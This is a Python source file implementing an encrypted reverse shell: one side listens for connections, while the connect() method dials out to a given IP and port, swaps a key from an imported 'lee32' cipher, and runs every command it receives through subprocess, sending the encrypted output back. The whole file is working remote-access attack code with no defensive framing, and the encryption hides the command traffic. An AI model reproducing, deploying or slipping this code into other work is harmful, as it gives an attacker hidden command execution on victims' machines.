from libs.lee32 import encrypt, decrypt, get_encryption_key
import subprocess
import os
import socket

class shell:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = int(port)
        self.key = None
        self.socket = socket.socket()

    def listen(self):
        self.socket.bind((self.ip, self.port))
        self.socket.listen()

    def accept(self):
        conn, addr = self.socket.accept()
        print(f"Connected by: {addr}")

        with conn:
            self.key = conn.recv(1024*3).decode('utf-8')

            while True:
                cwd = conn.recv(1024*10).decode('utf-8')
                cwd = decrypt(cwd, self.key)
                command = input(f"{cwd}$> ")

                data = encrypt(command, self.key)
                conn.send(data.encode('utf-8'))

                output = conn.recv(1024*10).decode('utf-8')
                output_lines = output.split('\n')

                output = ""

                for line in output_lines:
                    line = f"\n{decrypt(line, self.key)}"
                    output += line 

                if command.lower() == "exit_shell":
                    conn.close()
                    break

                print(output)

    def connect(self):
        try:
            self.socket.connect((self.ip, self.port))
            self.key = get_encryption_key()
            self.socket.sendall(self.key.encode('utf-8'))

            while True:
                data = os.getcwd()
                data = encrypt(data, self.key)

                self.socket.sendall(data.encode('utf-8'))

                data = self.socket.recv(1024*10).decode('utf-8')
                data = decrypt(data, self.key)

                if data.lower() == "exit_shell":
                    self.socket.close()
                    break

                else:

                    split_data = data.split()

                    if split_data[0].lower() == "cd":
                        try:
                            split_data.pop(0)
                            os.chdir(" ".join(split_data))
                            output = f"Changed directory to: {' '.join(split_data)}"

                        except:
                            output = "Can't change directory"

                    else:

                        try:
                            output = subprocess.getoutput(data)

                        except:
                            output = ""

                    data = ""
                    output_lines = output.split("\n")

                    for line in output_lines:
                        
                        line = encrypt(line, self.key)
                        data += f"{line}\n"                 

                    self.socket.sendall(data.encode('utf-8'))

        except:
            print("Can't connect")